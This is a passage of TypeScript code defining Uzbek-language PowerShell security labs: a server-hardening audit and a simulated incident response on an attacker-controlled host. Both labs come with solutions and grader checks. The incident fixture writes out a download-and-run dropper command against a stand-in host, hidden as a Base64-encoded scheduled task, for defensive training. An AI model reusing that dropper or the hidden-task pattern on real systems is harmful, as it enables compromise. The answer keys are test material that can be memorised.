      hint: "`Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 1` — 3 oydan oshgan: birinchi topilma (yangilanishlar o'rnatilmayapti).",
      solution: ['Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 1'],
      check: ({ output }) => output.includes('KB5041160') && !output.includes('KB5034439'),
    },
    {
      id: 'elevated',
      text: 'PowerShell haqiqatan administrator sifatida ochilganmi?',
      hint: '`whoami /groups` — BUILTIN\\Administrators va **High Mandatory Level**.',
      solution: ['whoami /groups'],
      check: ({ output }) => output.includes('High Mandatory Level'),
    },
    {
      id: 'users',
      teach: ['Get-LocalUser'],
      text: "Lokal akkauntlar: kim yoqilgan, oxirgi marta qachon kirgan, parol qachon o'zgartirilgan?",
      hint: '`Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordLastSet`',
      solution: ['Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordLastSet'],
      check: ({ output }) => /oldadmin\s+True/.test(output) && output.includes('PasswordLastSet'),
    },
    {
      id: 'stale',
      teach: ['Where-Object -and / -or'],
      text: 'Yoqilgan, lekin 90 kundan beri kirilmagan (yoki umuman kirilmagan) akkauntlarni toping.',
      hint: "`Get-LocalUser | Where-Object { $_.Enabled -and $_.LastLogon -lt (Get-Date).AddDays(-90) }` — hech kirilmagan akkauntda LastLogon bo'sh, u ham \"eski\" hisoblanadi.",
      solution: ['Get-LocalUser | Where-Object { $_.Enabled -and $_.LastLogon -lt (Get-Date).AddDays(-90) }'],
      check: ({ output }) => output.includes('oldadmin') && output.includes('test') && !output.includes('it-admin') && !output.includes('Guest'),
    },
    {
      id: 'admins',
      teach: ['Get-LocalGroupMember', 'Get-LocalGroupMember -Group'],
      text: 'Administrators guruhida kimlar bor?',
      hint: "`Get-LocalGroupMember -Group Administrators` — ishdan ketgan xodimning akkaunti hamon admin.",
      solution: ['Get-LocalGroupMember -Group Administrators'],
      check: ({ output }) => output.includes('SRV-APP-02\\oldadmin'),
    },
    {
      id: 'rdp-users',
      text: 'Masofadan (RDP) kira oladiganlar guruhini ham tekshiring.',
      hint: "`Get-LocalGroupMember 'Remote Desktop Users'` — nomida bo'sh joy bo'lsa, qo'shtirnoq kerak.",
      solution: [W`Get-LocalGroupMember 'Remote Desktop Users'`],
      check: ({ output }) => output.includes('SRV-APP-02\\test'),
    },
    {
      id: 'remove-admin',
      teach: ['Remove-LocalGroupMember', 'Remove-LocalGroupMember -Member'],
      text: '`oldadmin` ni Administrators guruhidan chiqaring.',
      hint: '`Remove-LocalGroupMember -Group Administrators -Member oldadmin`',
      solution: ['Remove-LocalGroupMember -Group Administrators -Member oldadmin'],
      check: ({ state }) => !state.win!.groups.find((g) => g.name === 'Administrators')!.members.includes('oldadmin'),
    },
    {
      id: 'disable',
      teach: ['Disable-LocalUser'],
      text: "`oldadmin` va `test` akkauntlarini bloklang (o'chirmang — tergov kerak bo'lib qolishi mumkin).",
      hint: '`Disable-LocalUser -Name oldadmin, test` — vergul bilan bir nechta qiymat.',
      solution: ['Disable-LocalUser -Name oldadmin, test'],
      check: ({ state }) => state.win!.users.filter((u) => ['oldadmin', 'test'].includes(u.name)).every((u) => !u.enabled),
    },
    {
      id: 'ports',
      teach: ['Get-NetTCPConnection', 'Get-NetTCPConnection -State'],
      text: 'Server qaysi portlarni tinglamoqda?',
      hint: "`Get-NetTCPConnection -State Listen` — 23 (Telnet) shifrlanmagan protokol, serverda bo'lmasligi kerak.",
      solution: ['Get-NetTCPConnection -State Listen'],
      check: ({ output }) => /0\.0\.0\.0\s+23\s/.test(output) && !output.includes('Established'),
    },
    {
      id: 'port-owner',
      teach: ['Get-NetTCPConnection -LocalPort', 'Get-Process -Id'],
      text: '23-portni qaysi jarayon ochgan? Bitta qatorda: ulanishdan PID ni olib, jarayonni toping.',
      hint: '`Get-Process -Id (Get-NetTCPConnection -LocalPort 23).OwningProcess` — qavs ichidagi buyruq avval bajariladi.',
      solution: ['Get-Process -Id (Get-NetTCPConnection -LocalPort 23).OwningProcess'],
      check: ({ output }) => output.includes('tlntsvr'),
    },
    {
      id: 'auto-services',
      teach: ['Get-CimInstance Win32_Service'],
      text: "Avtomatik ishga tushadigan xizmatlar va ular qaysi faylni ishga tushirishini ko'ring.",
      hint: '`Get-CimInstance Win32_Service | Where-Object StartMode -eq Auto | Select-Object Name, State, PathName`',
      solution: ['Get-CimInstance Win32_Service | Where-Object StartMode -eq Auto | Select-Object Name, State, PathName'],
      check: ({ output }) => output.includes('TlntSvr') && output.includes('RemoteRegistry') && !output.includes('wuauserv'),
    },
    {
      id: 'baseline',
      teach: ['Import-Csv', 'Compare-Object', 'Compare-Object -Property'],
      text: "Asosiy holat bilan solishtiring: toza o'rnatmada bo'lmagan qaysi xizmat paydo bo'lgan?",
      hint: '`Compare-Object (Import-Csv C:\\Audit\\baseline-services.csv) (Get-Service) -Property Name` — `=>` faqat hozir bor, `<=` faqat asosiy holatda.',
      solution: [W`Compare-Object (Import-Csv C:\Audit\baseline-services.csv) (Get-Service) -Property Name`],
      check: ({ output }) => /TlntSvr\s+=>/.test(output) && /Fax\s+<=/.test(output),
    },
    {
      id: 'telnet',
      teach: ['Stop-Service', 'Set-Service', 'Set-Service -StartupType'],
      text: "Telnet xizmatini to'xtating va qayta ishga tushmaydigan qiling.",
      hint: '`Stop-Service TlntSvr`, keyin `Set-Service TlntSvr -StartupType Disabled`',
      solution: ['Stop-Service TlntSvr', 'Set-Service TlntSvr -StartupType Disabled'],
      check: ({ state }) => {
        const s = state.win!.services.find((x) => x.name === 'TlntSvr')!;
        return s.status === 'Stopped' && s.startType === 'Disabled';
      },
    },
    {
      id: 'remote-registry',
      teach: ['Set-Service -Status'],
      text: "Asosiy holatda RemoteRegistry o'chirilgan edi. Uni bitta buyruq bilan to'xtatib, o'chirib qo'ying.",
      hint: '`Set-Service RemoteRegistry -StartupType Disabled -Status Stopped`',
      solution: ['Set-Service RemoteRegistry -StartupType Disabled -Status Stopped'],
      check: ({ state }) => {
        const s = state.win!.services.find((x) => x.name === 'RemoteRegistry')!;
        return s.status === 'Stopped' && s.startType === 'Disabled';
      },
    },
    {
      id: 'fw-list',
      teach: ['Get-NetFirewallRule', 'Get-NetFirewallRule -Enabled', 'Get-NetFirewallRule -Direction', 'Get-NetFirewallRule -Action'],
      text: "Firewall'da qaysi kiruvchi ulanishlarga ruxsat berilgan? Nomi, porti va kimdan ruxsat ekanini chiqaring.",
      hint: '`Get-NetFirewallRule -Enabled True -Direction Inbound -Action Allow | Select-Object DisplayName, LocalPort, RemoteAddress` — Any: butun dunyodan.',
      solution: ['Get-NetFirewallRule -Enabled True -Direction Inbound -Action Allow | Select-Object DisplayName, LocalPort, RemoteAddress'],
      check: ({ output }) => /Telnet Server\s+23\s+Any/.test(output),
    },
    {
      id: 'fw-remove',
      teach: ['Remove-NetFirewallRule', 'Remove-NetFirewallRule -DisplayName'],
      text: "Telnet uchun ochilgan ruxsat qoidasini o'chiring.",
      hint: "`Remove-NetFirewallRule -DisplayName 'Telnet Server'`",
      solution: [W`Remove-NetFirewallRule -DisplayName 'Telnet Server'`],
      check: ({ state }) => !state.win!.firewall.some((r) => r.displayName === 'Telnet Server'),
    },
    {
      id: 'fw-block',
      teach: ['New-NetFirewallRule', 'New-NetFirewallRule -LocalPort'],
      text: "Kimdir Telnet'ni qayta yoqib qo'ysa ham himoya bo'lsin: 23-portga kiruvchi TCP ulanishlarni taqiqlovchi qoida yarating.",
      hint: "`New-NetFirewallRule -DisplayName 'Block Telnet' -Direction Inbound -Action Block -Protocol TCP -LocalPort 23`",
      solution: [W`New-NetFirewallRule -DisplayName 'Block Telnet' -Direction Inbound -Action Block -Protocol TCP -LocalPort 23`],
      check: ({ state }) => state.win!.firewall.some((r) => r.action === 'Block' && r.direction === 'Inbound' && r.localPort === '23' && r.enabled),
    },
    {
      id: 'defender',
      teach: ['Get-MpComputerStatus'],
      text: 'Antivirus ishlayaptimi? Real vaqt himoyasi va bazalar yangiligini tekshiring.',
      hint: "`Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, AntivirusSignatureLastUpdated` — False: real vaqt himoyasi o'chirilgan!",
      solution: ['Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, AntivirusSignatureLastUpdated'],
      check: ({ output }) => /False/.test(output) && output.includes('RealTimeProtectionEnabled'),
    },
    {
      id: 'mp-pref',
      teach: ['Get-MpPreference'],
      text: "Defender'da istisnolar bormi — tekshirilmaydigan papkalar?",
      hint: '`Get-MpPreference | Select-Object DisableRealtimeMonitoring, ExclusionPath` — C:\\Temp tekshirilmayapti.',
      solution: ['Get-MpPreference | Select-Object DisableRealtimeMonitoring, ExclusionPath'],
      check: ({ output }) => output.includes('C:\\Temp'),
    },
    {
      id: 'autorun',
      teach: ['Get-ItemProperty', 'Get-ItemProperty -Path'],
      text: 'Kompyuter yonganda avtomatik ishga tushadigan dasturlarni (HKLM Run kaliti) tekshiring.',
      hint: '`Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` — Updater istisno qilingan C:\\Temp dan ishlaydi.',
      solution: [W`Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run`],
      check: ({ output }) => output.includes('C:\\Temp\\upd.exe'),
    },
    {
      id: 'task',
      teach: ['Get-ScheduledTask', 'Get-ScheduledTask -TaskPath'],
      text: "Ildiz papkadagi (`\\`) rejalashtirilgan vazifalar — odatda qo'lda yaratilganlar. Ularni toping va shubhalisi nimani ishga tushirishini ko'ring.",
      hint: "`Get-ScheduledTask -TaskPath '\\'`, keyin `(Get-ScheduledTask -TaskName TempCleanup).Actions`",
      solution: [W`Get-ScheduledTask -TaskPath '\'`, '(Get-ScheduledTask -TaskName TempCleanup).Actions'],
      check: ({ output }) => output.includes('C:\\Temp\\upd.exe') && output.includes('Execute'),
    },
    {
      id: 'hash',
      teach: ['Get-FileHash'],
      text: "`C:\\Temp\\upd.exe` ning SHA256 xeshini oling (keyin uni tahdidlar bazasida, masalan VirusTotal'da tekshirish mumkin).",
      hint: '`Get-FileHash C:\\Temp\\upd.exe`',
      solution: [W`Get-FileHash C:\Temp\upd.exe`],
      check: ({ output }) => /SHA256\s+[0-9A-F]{64}/.test(output),
    },
    {
      id: 'mp-fix',
      teach: ['Set-MpPreference', 'Set-MpPreference -DisableRealtimeMonitoring', 'Remove-MpPreference', 'Remove-MpPreference -ExclusionPath'],
      text: "Defender'ni tiklang: real vaqt himoyasini yoqing va C:\\Temp istisnosini olib tashlang.",
      hint: "`Set-MpPreference -DisableRealtimeMonitoring $false`, keyin `Remove-MpPreference -ExclusionPath 'C:\\Temp'`",
      solution: ['Set-MpPreference -DisableRealtimeMonitoring $false', W`Remove-MpPreference -ExclusionPath 'C:\Temp'`],
      check: ({ state }) => state.win!.defender.realtime && state.win!.defender.exclusionPaths.length === 0,
    },
    {
      id: 'scan',
      teach: ['Start-MpScan', 'Start-MpScan -ScanPath', 'Get-MpThreat'],
      text: "Endi C:\\Temp ni tekshiring va Defender nima topganini ko'ring.",
      hint: '`Start-MpScan -ScanPath C:\\Temp`, keyin `Get-MpThreat`',
      solution: [W`Start-MpScan -ScanPath C:\Temp`, 'Get-MpThreat'],
      check: ({ state, output }) => state.win!.defender.threats.length > 0 && output.includes('Backdoor:Win32/Lab.RemoteAdmin'),
    },
    {
      id: 'cleanup',
      teach: ['Remove-ItemProperty', 'Remove-ItemProperty -Name', 'Disable-ScheduledTask'],
      text: "Fayl karantinga olindi, lekin uni ishga tushiruvchi yozuvlar qoldi. Run kalitidagi `Updater` ni o'chiring va `TempCleanup` vazifasini o'chirib qo'ying.",
      hint: '`Remove-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name Updater`, keyin `Disable-ScheduledTask -TaskName TempCleanup`',
      solution: [W`Remove-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run -Name Updater`, 'Disable-ScheduledTask -TaskName TempCleanup'],
      check: ({ state }) => {
        const run = state.win!.registry.get('hklm:\\software\\microsoft\\windows\\currentversion\\run');
        return !!run && !('Updater' in run.values) && state.win!.tasks.find((t) => t.name === 'TempCleanup')?.state === 'Disabled';
      },
    },
    {
      id: 'challenge',
      challenge: true,
      text: "Mustaqil vazifa: auditdan keyingi holatni `C:\\Audit\\natija.txt` ga yozing: avval Administrators a'zolari, keyin ishlab turgan **va** avtomatik ishga tushadigan xizmatlar.",
      hint: "Ikkita buyruq: birinchisi faylga yozadi, ikkinchisi `-Append` bilan qo'shadi. Xizmat uchun ikki shart `-and` bilan.",
      solution: [
        W`Get-LocalGroupMember Administrators | Out-File C:\Audit\natija.txt`,
        W`Get-Service | Where-Object { $_.Status -eq 'Running' -and $_.StartType -eq 'Automatic' } | Out-File C:\Audit\natija.txt -Append`,
      ],
      check: ({ state }) => {
        const t = fileAt(state, '/Audit/natija.txt') ?? '';
        return t.includes('SRV-APP-02\\it-admin') && !t.includes('oldadmin') && t.includes('QaydnomaApp') && !t.includes('TlntSvr') && !t.includes('wuauserv');
      },
    },
  ],
};

/* ── 3. Live response on SRV-FILE-01 (the host behind the "Windows hodisalari" SOC lab) ── */

export const C2_IP = '198.51.100.40';

/** -EncodedCommand takes Base64 of UTF-16LE text. */
function encodePs(text: string): string {
  let bin = '';
  for (const ch of text) {
    const c = ch.charCodeAt(0);
    bin += String.fromCharCode(c & 0xff, c >> 8);
  }
  return btoa(bin);
}

const DROPPER = "Invoke-WebRequest http://update-cdn.example/u.bin -OutFile C:\\Users\\Public\\svcupd.exe; Start-Process C:\\Users\\Public\\svcupd.exe -ArgumentList '-k'";
export const ENCODED_TASK = encodePs(DROPPER);
const SIEM_JSON = '[\n' + SECURITY_EVENTS.trim().split('\n').join(',\n') + '\n]\n';
const SIEM_SVC_FAILS = SECURITY_EVENTS.trim().split('\n').filter((l) => l.includes('"EventID":4625') && l.includes('"TargetUserName":"svc_backup"')).length;

const sec = (msg: string[]) => msg.join('\n');

export const winIncident: Lab = {
  id: 'windows-insident',
  title: 'Insident: RDP orqali kirgan hujumchi (jonli tahlil)',
  summary: "Zararlangan Windows serverda jonli tahlil va tozalash: jarayon va ulanishlar, dalil yig'ish, tozalangan jurnal o'rniga boshqa manbalar, kodlangan PowerShell buyrug'i, persistence, cheklash va yo'q qilish.",
  minutes: 70,
  level: 3,
  intro:
    "SOC'dagi \"Windows hodisalari\" labida SIEM nusxasidan ko'rgan voqea: kechasi `198.51.100.40` dan RDP orqali parol tanlab, `svc_backup` akkaunti bilan `SRV-FILE-01` ga kirilgan. Endi siz o'sha serverning o'zidasiz — **ertalab soat 09:30**, PowerShell administrator sifatida ochilgan, siz `ir-analyst`.\n\n" +
    "Tartib muhim: avval **o'zgaruvchan ma'lumot** (jarayonlar, ulanishlar) va dalil, keyin jurnallar, keyin cheklash va tozalash. Hujumchi Security jurnalini tozalagan — lekin System, PowerShell va Defender jurnallari hamda SIEM'ga yuborilgan nusxa (`C:\\IR\\siem-security.json`) qolgan.\n\n" +
    "Har bir qadamni vaqt chizig'iga yozib boring — keyingi hisobot uchun kerak bo'ladi.",
  shell: () => ({
    user: 'ir-analyst',
    fs: {
      Users: {
        'ir-analyst': { Desktop: {}, Documents: {} },
        svc_backup: { Desktop: {} },
        Public: { 'svcupd.exe': big('MZ', 4400) },
      },
      IR: { 'siem-security.json': SIEM_JSON },
      Shares: { Moliya: { 'byudjet-2027.xlsx': big('PK', 2600) } },
      Windows: { System32: { 'services.exe': big('MZ', 700) } },
      ProgramData: {},
    },
    windows: {
      computer: 'SRV-FILE-01',
      ip: '10.10.20.15',
      processes: [
        ...baseProcs,
        { id: 640, name: 'services', path: 'C:\\Windows\\System32\\services.exe', user: 'NT AUTHORITY\\SYSTEM', si: 0, ws: 9.8, cpu: 22.4 },
        { id: 1100, name: 'svchost', path: 'C:\\Windows\\System32\\svchost.exe', commandLine: 'C:\\Windows\\System32\\svchost.exe -k termsvcs -s TermService', parentId: 640, user: 'NT AUTHORITY\\NETWORK SERVICE', si: 0, ws: 19.4, cpu: 6.1 },
        { id: 4120, name: 'svcupd', path: 'C:\\Users\\Public\\svcupd.exe', commandLine: 'C:\\Users\\Public\\svcupd.exe -k', parentId: 640, user: 'NT AUTHORITY\\SYSTEM', si: 0, ws: 74.2, cpu: 1840.2, start: T(17, 2, 21, 4) },
        { id: 6230, name: 'explorer', path: 'C:\\Windows\\explorer.exe', user: 'SRV-FILE-01\\ir-analyst', si: 2, ws: 96.1, cpu: 3.4, start: T(17, 9, 12) },
        { id: 6410, name: 'pwsh', path: 'C:\\Program Files\\PowerShell\\7\\pwsh.exe', user: 'SRV-FILE-01\\ir-analyst', si: 2, ws: 88.7, cpu: 2.2, start: T(17, 9, 14) },
      ],
      services: [
        ...baseServices,
        { name: 'TermService', displayName: 'Remote Desktop Services', status: 'Running', startType: 'Manual', path: 'C:\\Windows\\System32\\svchost.exe -k termsvcs', account: 'NT Authority\\NetworkService', pid: 1100 },
        { name: 'WinUpdateSvc', displayName: 'Windows Update Helper', status: 'Running', startType: 'Automatic', path: 'C:\\Users\\Public\\svcupd.exe -k', account: 'LocalSystem', pid: 4120 },
      ],
      users: [
        { name: 'Administrator', enabled: false, description: 'Built-in account for administering the computer/domain' },
        { name: 'd.karimova', enabled: true, description: 'Moliya', lastLogon: T(17, 7, 58, 2) },
        { name: 'Guest', enabled: false, description: 'Built-in account for guest access to the computer/domain' },
        { name: 'helpdesk2', enabled: true, description: '', passwordLastSet: T(17, 2, 18, 7) },
        { name: 'ir-analyst', enabled: true, description: 'Incident response', lastLogon: T(17, 9, 12) },
        { name: 'svc_backup', enabled: true, description: 'Zaxira nusxa xizmati', lastLogon: T(17, 2, 14, 51), passwordLastSet: Date.UTC(2023, 1, 6) },
      ],
      groups: [
        { name: 'Administrators', description: 'Administrators have complete and unrestricted access to the computer/domain', members: ['Administrator', 'ir-analyst', 'helpdesk2'] },
        { name: 'Backup Operators', description: 'Backup Operators can override security restrictions for the sole purpose of backing up or restoring files', members: ['svc_backup'] },
        { name: 'Remote Desktop Users', description: 'Members in this group are granted the right to logon remotely', members: ['svc_backup'] },
        { name: 'Users', description: 'Users are prevented from making accidental or intentional system-wide changes', members: ['d.karimova', 'helpdesk2', 'svc_backup'] },
      ],
      connections: [
        { localAddress: '0.0.0.0', localPort: 445, remoteAddress: '0.0.0.0', remotePort: 0, state: 'Listen', pid: 4 },
        { localAddress: '0.0.0.0', localPort: 3389, remoteAddress: '0.0.0.0', remotePort: 0, state: 'Listen', pid: 1100 },
        { localAddress: '0.0.0.0', localPort: 4444, remoteAddress: '0.0.0.0', remotePort: 0, state: 'Listen', pid: 4120 },
        { localAddress: '10.10.20.15', localPort: 3389, remoteAddress: '10.10.20.31', remotePort: 52011, state: 'Established', pid: 1100 },
        { localAddress: '10.10.20.15', localPort: 50112, remoteAddress: C2_IP, remotePort: 443, state: 'Established', pid: 4120 },
      ],
      dns: { 'update-cdn.example': C2_IP },
      openPorts: { [C2_IP]: [443] },
      dnsCache: [
        { entry: 'settings-win.data.microsoft.com', data: '20.42.65.85', ttl: 1820 },
        { entry: 'update-cdn.example', data: C2_IP, ttl: 240 },
        { entry: 'srv-dc-01.lab', data: '10.10.20.5', ttl: 1200 },
      ],
      registry: {
        'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run': { SecurityHealth: 'C:\\Windows\\System32\\SecurityHealthSystray.exe', WinUpd: 'C:\\Users\\Public\\svcupd.exe -k' },
        'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run': {},
      },
      tasks: [
        { path: '\\', name: 'OneDriveSync', state: 'Ready', execute: 'powershell.exe', arguments: `-NoProfile -w hidden -enc ${ENCODED_TASK}`, author: 'SRV-FILE-01\\svc_backup', runAs: 'SYSTEM', trigger: 'At log on' },
        { path: '\\Microsoft\\Windows\\Defrag\\', name: 'ScheduledDefrag', state: 'Ready', execute: '%windir%\\system32\\defrag.exe', arguments: '-c -h -o -$' },
      ],
      defender: { exclusionPaths: ['C:\\Users\\Public'], signatures: [{ file: 'svcupd.exe', threat: 'Backdoor:Win64/Lab.Rdpdoor' }] },
      events: [
        { log: 'Security', id: 1102, time: T(17, 2, 26, 44), provider: 'Microsoft-Windows-Eventlog', message: sec(['The audit log was cleared.', 'Subject:', '\tSecurity ID:\t\tSRV-FILE-01\\svc_backup', '\tAccount Name:\t\tsvc_backup', '\tDomain Name:\t\tSRV-FILE-01']) },
        { log: 'Security', id: 4634, time: T(17, 2, 27, 30), message: sec(['An account was logged off.', '', 'Subject:', '\tAccount Name:\t\tsvc_backup', '\tLogon Type:\t\t\t10']) },
        { log: 'Security', id: 4624, time: T(17, 7, 58, 2), message: sec(['An account was successfully logged on.', '', 'Logon Type:\t\t\t3', 'New Logon:', '\tAccount Name:\t\td.karimova', 'Network Information:', '\tSource Network Address:\t10.10.20.31']) },
        { log: 'Security', id: 4624, time: T(17, 9, 12, 0), message: sec(['An account was successfully logged on.', '', 'Logon Type:\t\t\t10', 'New Logon:', '\tAccount Name:\t\tir-analyst', 'Network Information:', '\tSource Network Address:\t10.10.20.31']) },
        { log: 'System', id: 7036, time: T(17, 1, 5, 12), message: 'The Windows Update service entered the stopped state.' },
        { log: 'System', id: 7045, time: T(17, 2, 21, 3), message: sec(['A service was installed in the system.', '', 'Service Name:  WinUpdateSvc', 'Service File Name:  C:\\Users\\Public\\svcupd.exe -k', 'Service Type:  user mode service', 'Service Start Type:  auto start', 'Service Account:  LocalSystem']) },
        { log: 'System', id: 7036, time: T(17, 2, 21, 4), message: 'The Windows Update Helper service entered the running state.' },
        { log: 'Microsoft-Windows-PowerShell/Operational', id: 4104, time: T(17, 2, 16, 5), level: 'Warning', message: sec(['Creating Scriptblock text (1 of 1):', 'Get-LocalGroupMember Administrators', '', 'ScriptBlock ID: 6b1f0a4e-2c7d-4b8e-9f31-5d2a8c4e7a10']) },
        { log: 'Microsoft-Windows-PowerShell/Operational', id: 4104, time: T(17, 2, 19, 40), level: 'Warning', message: sec(['Creating Scriptblock text (1 of 1):', 'Add-MpPreference -ExclusionPath C:\\Users\\Public', '', 'ScriptBlock ID: 0c9e7d21-8a4f-4f6b-b2d3-1e7a9c5b3f42']) },
        { log: 'Microsoft-Windows-PowerShell/Operational', id: 4104, time: T(17, 2, 22, 15), level: 'Warning', message: sec(['Creating Scriptblock text (1 of 1):', "Register-ScheduledTask -TaskName OneDriveSync -User SYSTEM -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Action (New-ScheduledTaskAction -Execute powershell.exe -Argument '-NoProfile -w hidden -enc ...')", '', 'ScriptBlock ID: 9a2c4e6f-1b3d-4f5a-8c7e-2d4f6a8b0c13']) },
        { log: 'Microsoft-Windows-Windows Defender/Operational', id: 5007, time: T(17, 2, 19, 41), message: sec(['Microsoft Defender Antivirus Configuration has changed. If this is an unexpected event you should review the settings as this may be the result of malware.', '\tOld value: ', '\tNew value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Users\\Public = 0x0']) },
      ],
    },
  }),
  tasks: [
    {
      id: 'procs',
      teach: ['Get-Process -IncludeUserName'],
      text: "Avval o'zgaruvchan ma'lumot: qaysi jarayonlar eng ko'p CPU ishlatmoqda va kim nomidan?",
      hint: '`Get-Process -IncludeUserName | Sort-Object CPU -Descending | Select-Object -First 5` — svcupd SYSTEM nomidan, 1800 soniyadan ortiq CPU.',
      solution: ['Get-Process -IncludeUserName | Sort-Object CPU -Descending | Select-Object -First 5'],
      check: ({ output }) => {
        const rows = output.split('\n').filter((l) => /\d+\s+\S+\s+\S+$/.test(l) && !l.includes('---'));
        return (rows[1] ?? rows[0] ?? '').includes('svcupd') || (output.indexOf('svcupd') > -1 && output.indexOf('svcupd') < output.indexOf('MsMpEng'));
      },
    },
    {
      id: 'conns',
      text: 'Server hozir kimlar bilan ulangan?',
      hint: '`Get-NetTCPConnection -State Established` — 10.10.20.31 — sizning RDP sessiyangiz; 198.51.100.40:443 — hujumchi manzili, PID 4120.',
      solution: ['Get-NetTCPConnection -State Established'],
      check: ({ output }) => output.includes(C2_IP) && /4120/.test(output),
    },
    {
      id: 'listen',
      teach: ['Get-NetTCPConnection -OwningProcess'],
      text: '4120-jarayon yana qaysi portni tinglamoqda?',
      hint: '`Get-NetTCPConnection -OwningProcess 4120` — 4444: tashqaridan ulanish uchun ochilgan eshik.',
      solution: ['Get-NetTCPConnection -OwningProcess 4120'],
      check: ({ output }) => /4444/.test(output) && /Listen/.test(output),
    },
    {
      id: 'cmdline',
      teach: ['Get-CimInstance Win32_Process', 'Get-CimInstance -Filter'],
      text: 'Bu jarayonning to\'liq buyruq qatori va ota jarayoni (ParentProcessId) qanday?',
      hint: '`Get-CimInstance Win32_Process -Filter "ProcessId=4120" | Select-Object ProcessId, ParentProcessId, CommandLine`',
      solution: ['Get-CimInstance Win32_Process -Filter "ProcessId=4120" | Select-Object ProcessId, ParentProcessId, CommandLine'],
      check: ({ output }) => /4120\s+640\s+C:\\Users\\Public\\svcupd\.exe -k/.test(output),
    },
    {
      id: 'parent',
      text: 'Ota jarayon (640) kim? Bu jarayon qanday ishga tushganini ko\'rsatadi.',
      hint: '`Get-Process -Id 640` — services: demak svcupd **xizmat** sifatida ishlayapti.',
      solution: ['Get-Process -Id 640'],
      check: ({ output }) => /640\s+0 services/.test(output),
    },
    {
      id: 'dns',
      teach: ['Get-DnsClientCache', 'Resolve-DnsName'],
      text: 'DNS keshida hujumchi manziliga ishora qiluvchi domen bormi?',
      hint: '`Get-DnsClientCache | Select-Object Entry, Data` — update-cdn.example → 198.51.100.40. Domen ham indikator (IOC).',
      solution: ['Get-DnsClientCache | Select-Object Entry, Data'],
      check: ({ output }) => new RegExp(`update-cdn\\.example\\s+${C2_IP.replace(/\./g, '\\.')}`).test(output),
    },
    {
      id: 'evidence-dir',
      text: "Dalillar uchun `C:\\IR\\dalil` papkasini yarating.",
      hint: '`mkdir C:\\IR\\dalil`',
      solution: [W`mkdir C:\IR\dalil`],
      check: ({ state }) => isDir(state, '/IR/dalil'),
    },
    {
      id: 'volatile',
      teach: ['Export-Csv', 'Export-Csv -Path'],
      text: "Jarayonlar va ulanishlar ro'yxatini hozirgi holicha CSV ga saqlang: `jarayonlar.csv` va `ulanishlar.csv` (dalil papkasida).",
      hint: '`Get-Process -IncludeUserName | Export-Csv C:\\IR\\dalil\\jarayonlar.csv`, keyin `Get-NetTCPConnection | Export-Csv C:\\IR\\dalil\\ulanishlar.csv`',
      solution: [W`Get-Process -IncludeUserName | Export-Csv C:\IR\dalil\jarayonlar.csv`, W`Get-NetTCPConnection | Export-Csv C:\IR\dalil\ulanishlar.csv`],
      check: ({ state }) => (fileAt(state, '/IR/dalil/jarayonlar.csv') ?? '').includes('svcupd') && (fileAt(state, '/IR/dalil/ulanishlar.csv') ?? '').includes(C2_IP),
    },
    {
      id: 'hash',
      text: 'Zararli faylning SHA256 xeshini dalil papkasiga `xesh.csv` qilib saqlang.',
      hint: '`Get-FileHash C:\\Users\\Public\\svcupd.exe | Export-Csv C:\\IR\\dalil\\xesh.csv`',
      solution: [W`Get-FileHash C:\Users\Public\svcupd.exe | Export-Csv C:\IR\dalil\xesh.csv`],
      check: ({ state }) => /"SHA256","[0-9A-F]{64}"/.test(fileAt(state, '/IR/dalil/xesh.csv') ?? ''),
    },
    {
      id: 'copy',
      teach: ['Copy-Item'],
      text: "Faylning o'zini ham dalil papkasiga nusxalang (tozalashdan keyin u yo'qoladi).",
      hint: '`Copy-Item C:\\Users\\Public\\svcupd.exe C:\\IR\\dalil`',
      solution: [W`Copy-Item C:\Users\Public\svcupd.exe C:\IR\dalil`],
      check: ({ state }) => fileAt(state, '/IR/dalil/svcupd.exe') !== null,
    },
    {
      id: 'security-log',
      teach: ['Get-WinEvent', 'Get-WinEvent -LogName', 'Get-WinEvent -Oldest', 'Get-WinEvent -MaxEvents N'],
      text: "Endi jurnallar. Security jurnalidagi eng **eski** 3 ta hodisani ko'ring — tun voqealari bormi?",
      hint: '`Get-WinEvent -LogName Security -Oldest -MaxEvents 3` — eng birinchisi 1102: jurnal tozalangan. Tungacha bo\'lgan yozuvlar yo\'q.',
      solution: ['Get-WinEvent -LogName Security -Oldest -MaxEvents 3'],
      check: ({ output }) => /2:26:44 AM\s+1102/.test(output),
    },
    {
      id: 'cleared',
      teach: ['Get-WinEvent -FilterHashtable', 'Format-List'],
      text: 'Jurnalni kim tozalagan? 1102 hodisasini to\'liq o\'qing.',
      hint: "`Get-WinEvent -FilterHashtable @{LogName='Security'; Id=1102} | Format-List TimeCreated, Message`",
      solution: [W`Get-WinEvent -FilterHashtable @{LogName='Security'; Id=1102} | Format-List TimeCreated, Message`],
      check: ({ output }) => output.includes('svc_backup') && output.includes('The audit log was cleared.'),
    },
    {
      id: 'siem',
      teach: ['Get-Content -Raw', 'ConvertFrom-Json'],
      text: "Security jurnalining SIEM'dagi nusxasini oching: JSON ni obyektlarga aylantirib, `$ev` o'zgaruvchisiga saqlang va Event ID bo'yicha guruhlang.",
      hint: '`$ev = Get-Content C:\\IR\\siem-security.json -Raw | ConvertFrom-Json`, keyin `$ev | Group-Object EventID -NoElement | Sort-Object Count -Descending`',
      solution: [W`$ev = Get-Content C:\IR\siem-security.json -Raw | ConvertFrom-Json`, '$ev | Group-Object EventID -NoElement | Sort-Object Count -Descending'],
      check: ({ output }) => /^\s+\d+ 4625$/m.test(output) && output.includes('1102'),
    },
    {
      id: 'spray',
      text: "Muvaffaqiyatsiz kirishlar (4625) qaysi akkauntlarga bo'lgan?",
